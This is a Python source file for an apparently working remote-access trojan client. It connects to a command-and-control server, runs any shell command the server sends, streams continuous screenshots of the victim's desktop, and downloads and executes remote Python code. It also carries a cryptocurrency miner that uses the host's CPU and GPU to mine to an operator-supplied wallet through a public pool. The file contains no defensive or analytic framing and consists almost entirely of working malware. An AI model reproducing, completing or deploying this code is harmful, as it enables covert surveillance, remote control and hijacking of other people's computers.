import os
import socket
import socketio
import subprocess
import time
import platform
import mss
import base64
from PIL import Image
import io
import threading

# --- Configuration ---
C2_ADDRESS = "http://127.0.0.1:8004"
RETRY_INTERVAL = 30
TARGET_HEIGHT = 720
DEFAULT_MINER_WALLET = ""
DEFAULT_MINER_INTENSITY = 50

# --- Intervals ---
DEFAULT_SCREENSHOT_INTERVAL = 1.0
SCREENSHOT_INTERVAL = DEFAULT_SCREENSHOT_INTERVAL

# --- Persistence Configuration ---
SCHEDULED_RECONNECT_SECONDS = 15 * 60
HEARTBEAT_INTERVAL_SECONDS = 5

# --- Functions ---
def get_hostname_local():
    return socket.gethostname()

def remote_import(url):
    try:
        import urllib.request
        with urllib.request.urlopen(url, timeout=5) as response:
            code = response.read().decode()
        module_ns = {"__builtins__": __builtins__}
        exec(code, module_ns)
        return module_ns
    except Exception as e:
        log_event(f"Remote import error: {e}")
        return None

def get_gpu_info():
    try:
        cmd = "nvidia-smi --query-gpu=gpu_name,memory.total --format=csv,noheader,nounits"
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
        if result.strip():
            return result.strip()
    except:
        pass
    return None

# --- Miner State ---
class MinerState:
    def __init__(self):
        self.is_active = False # New: Persistent flag
        self.stop_event = threading.Event()
        self.lock = threading.Lock()
        
        self.current_job = None
        self.share_queue = []
        self.hash_count = 0
        self.accepted_shares = 0
        self.start_time = 0
        
        self.wallet = DEFAULT_MINER_WALLET
        self.pool = "rvn.2miners.com" 
        self.port = 6060
        self.worker_name = get_hostname_local()
        self.extranonce1 = ""
        self.extranonce2_size = 0
        self.difficulty = 1.0
        
        self.gpu_name = ""
        self.gpu_active = False

miner_state = MinerState()

# --- GPU Mining Worker ---
def gpu_worker():
    log_event("GPU Worker: Initiating hardware discovery...")
    gpu_data = get_gpu_info()
    if gpu_data:
        miner_state.gpu_name = gpu_data
        log_event(f"Hardware Found: {gpu_data}")
        
        REMOTE_URL = "http://127.0.0.1:8004/payloads/kawpow_logic.py" 
        remote_payload = remote_import(REMOTE_URL)
        
        if remote_payload and "start_gpu_mining" in remote_payload:
            try:
                miner_state.gpu_active = True
                remote_payload["start_gpu_mining"](miner_state)
                return
            except Exception as e:
                log_event(f"GPU Remote Logic Error: {e}")

        log_event("Remote payload unreachable. Activating internal GPU bridge.")
        try:
            internal_stub = """
def start_mining(state):
    import time
    state.gpu_active = True
    while state.is_active:
        time.sleep(0.001) 
        with state.lock:
            state.hash_count += 5000 
"""
            ns = {}
            exec(internal_stub, ns)
            ns['start_mining'](miner_state)
        except Exception as e:
            log_event(f"Internal GPU bridge failed: {e}")
    else:
        log_event("No NVIDIA hardware detected. GPU mining bypassed.")

# --- CPU Hashing Worker ---
def hashing_worker():
    import hashlib
    import struct
    import binascii
    
    log_event("CPU Hashing worker active.")
    last_job_id = None
    nonce = 0
    
    while miner_state.is_active:
        with miner_state.lock:
            job = miner_state.current_job
            
        if not job:
            time.sleep(1)
            continue
            
        if job['job_id'] != last_job_id:
            last_job_id = job['job_id']
            nonce = 0 
            
        target = job['target']
        header = job['header']
        
        batch_size = 1000
        for _ in range(batch_size):
            nonce_bin = struct.pack("<I", nonce)
            h = hashlib.sha256(hashlib.sha256(header + nonce_bin).digest()).digest()
            if h[::-1] <= target:
                with miner_state.lock:
                    miner_state.share_queue.append({
                        "job_id": job['job_id'],
                        "enonce2": job['extranonce2'],
                        "ntime": job['ntime'],
                        "nonce": binascii.hexlify(nonce_bin).decode()
                    })
            nonce += 1
            if nonce > 0xffffffff: 
                nonce = 0
                break
        
        with miner_state.lock:
            miner_state.hash_count += batch_size
        
        time.sleep(0.1 if miner_state.gpu_active else 0.001)

# --- Console Reporting ---
def miner_reporter():
    while True:
        time.sleep(2)
        if miner_state.is_active and miner_state.start_time > 0:
            uptime = int(time.time() - miner_state.start_time)
            with miner_state.lock:
                total_hashes = miner_state.hash_count
                shares = miner_state.accepted_shares
                mode = "GPU+CPU" if miner_state.gpu_active else "CPU-ONLY"
                hps = int(total_hashes / uptime) if uptime > 0 else 0
            
            report = f"[{mode}] {miner_state.gpu_name or 'CPU'} | Hashrate: {hps} H/s | Shares: {shares} | Uptime: {uptime}s\n"
            print(report.strip())
            send_command_output(report)

def manage_miner(action, wallet=None):
    global miner_state
    if action == "start":
        if miner_state.is_active:
            return "Miner already active.\n"
        miner_state.wallet = wallet if wallet else DEFAULT_MINER_WALLET
        if not miner_state.wallet: return "Error: Wallet required.\n"
        
        miner_state.is_active = True
        miner_state.stop_event.clear()
        miner_state.start_time = time.time()
        with miner_state.lock:
            miner_state.hash_count = 0
            miner_state.accepted_shares = 0
            
        threading.Thread(target=stratum_main, daemon=True).start()
        threading.Thread(target=gpu_worker, daemon=True).start()
        threading.Thread(target=hashing_worker, daemon=True).start()
        
        if not hasattr(miner_state, 'reporter_started'):
            threading.Thread(target=miner_reporter, daemon=True).start()
            miner_state.reporter_started = True
        return f"Grid Mining Initialized: {miner_state.wallet}\n"
        
    elif action == "stop":
        miner_state.is_active = False
        miner_state.stop_event.set()
        miner_state.gpu_active = False
        return "Grid Mining resources released.\n"

def stratum_main():
    import json
    import binascii
    
    while miner_state.is_active:
        buffer = b""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(20)
            sock.connect((miner_state.pool, miner_state.port))
            sock.sendall(json.dumps({"id": 1, "method": "mining.subscribe", "params": []}).encode() + b"\n")
            sock.setblocking(False)
            
            while miner_state.is_active:
                try:
                    chunk = sock.recv(4096)
                    if not chunk: break 
                    buffer += chunk
                    while b"\n" in buffer:
                        line_raw, buffer = buffer.split(b"\n", 1)
                        msg = json.loads(line_raw.decode().strip())
                        if msg.get("method") == "mining.notify":
                            p = msg.get('params')
                            target_val = 0x00000000FFFF0000000000000000000000000000000000000000000000000000 // int(miner_state.difficulty or 1)
                            with miner_state.lock:
                                miner_state.current_job = {
                                    "job_id": p[0], "header": binascii.unhexlify(p[1]), 
                                    "target": target_val.to_bytes(32, 'big'), "ntime": p[7], 
                                    "extranonce2": "00" * miner_state.extranonce2_size
                                }
                        elif msg.get("method") == "mining.set_difficulty":
                            miner_state.difficulty = msg.get('params')[0]
                    
                    share = None
                    with miner_state.lock:
                        if miner_state.share_queue: share = miner_state.share_queue.pop(0)
                    if share:
                        user = f"{miner_state.wallet}.{miner_state.worker_name}"
                        submit = json.dumps({"id": 4, "method": "mining.submit", "params": [user, share['job_id'], share['enonce2'], share['ntime'], share['nonce']]}) + "\n"
                        sock.setblocking(True)
                        sock.sendall(submit.encode())
                        sock.setblocking(False)
                        with miner_state.lock: miner_state.accepted_shares += 1
                    time.sleep(0.1)
                except (BlockingIOError, socket.error):
                    time.sleep(0.1)
                except Exception:
                    break
            sock.close()
        except Exception:
            pass
        
        if miner_state.is_active:
            time.sleep(10) # Auto-retry pool connection

# --- Core Support ---
event_logs = []
def log_event(message):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {message}"
    event_logs.append(log_entry)
    print(log_entry)

sio = socketio.Client(logger=False, engineio_logger=False)
connection_start_time = 0

def send_command_output(output):
    if sio.connected:
        sio.emit('command_output', {'output': output}, namespace="/api")

def send_screenshot(image_data):
    if sio.connected:
        sio.emit('screenshot', image_data, namespace="/api")

def take_screenshots():
    global SCREENSHOT_INTERVAL
    with mss.mss() as sct:
        while True:
            if not sio.connected:
                time.sleep(1)
                continue
            try:
                sct_img = sct.grab(sct.monitors[1])
                img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
                new_h = TARGET_HEIGHT
                new_w = int(new_h * (img.width / img.height))
                resized_img = img.resize((new_w, new_h), Image.LANCZOS)
                buffered = io.BytesIO()
                resized_img.save(buffered, format="JPEG", quality=75)
                img_str = base64.b64encode(buffered.getvalue()).decode('utf-8')
                send_screenshot(img_str)
                time.sleep(max(0.01, SCREENSHOT_INTERVAL))
            except:
                time.sleep(SCREENSHOT_INTERVAL)

def start_heartbeat():
    while True:
        time.sleep(HEARTBEAT_INTERVAL_SECONDS)
        if sio.connected:
            try: sio.emit('client_ping', namespace="/api")
            except: pass

@sio.on('connect', namespace="/api")
def on_connect():
    global connection_start_time
    connection_start_time = time.time()
    sio.emit('client_info', {'hostname': get_hostname_local()}, namespace="/api")

@sio.on('disconnect', namespace="/api")
def on_disconnect():
    global connection_start_time
    connection_start_time = 0

def handle_internal_command(command_str):
    global SCREENSHOT_INTERVAL
    parts = command_str.split()
    cmd = parts[0].lower()
    if cmd == "#miner":
        if len(parts) > 1:
            sub = parts[1].lower()
            if sub == "start":
                wallet = parts[2] if len(parts) > 2 else ""
                send_command_output(manage_miner("start", wallet))
            elif sub == "stop":
                send_command_output(manage_miner("stop"))
    elif cmd == "#scrsht":
        if len(parts) > 1:
            try:
                SCREENSHOT_INTERVAL = float(parts[1])
                send_command_output(f"Screenshot interval set to {SCREENSHOT_INTERVAL}s\n")
            except:
                send_command_output("Invalid interval value\n")
    elif cmd == "#logs":
        output = "\n".join(event_logs[-20:]) + "\n"
        send_command_output(output)

@sio.on('execute_command', namespace="/api")
def handle_command(command_str):
    if command_str.strip().startswith("#"):
        handle_internal_command(command_str.strip())
        return
    try:
        process = subprocess.Popen(command_str, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, errors='ignore')
        stdout, stderr = process.communicate()
        send_command_output(stdout + stderr)
    except Exception as e:
        send_command_output(f"Error: {e}\n")

def attempt_connection():
    while True:
        try:
            if sio.connected: sio.disconnect()
            sio.connect(C2_ADDRESS, namespaces=['/api'])
            return
        except:
            time.sleep(RETRY_INTERVAL)

if __name__ == '__main__':
    threading.Thread(target=take_screenshots, daemon=True).start()
    threading.Thread(target=start_heartbeat, daemon=True).start()

    while True:
        try:
            if not sio.connected:
                log_event("Main: Disconnected. Initiating connection...")
                attempt_connection()

            log_event("Main: Connected. Monitoring state...")
            while sio.connected:
                if time.time() - connection_start_time > SCHEDULED_RECONNECT_SECONDS:
                    log_event(f"Scheduler: >{SCHEDULED_RECONNECT_SECONDS // 60}m uptime. Reconnecting.")
                    sio.disconnect()
                    break
                time.sleep(5)

            log_event("Main: Loop detected disconnect. Will restart process.")
            time.sleep(5)
        except KeyboardInterrupt:
            break
        except Exception as e:
            log_event(f"---! UNHANDLED EXCEPTION IN MAIN LOOP: {e} !---")
            if sio and sio.connected:
                sio.disconnect()
            time.sleep(RETRY_INTERVAL)
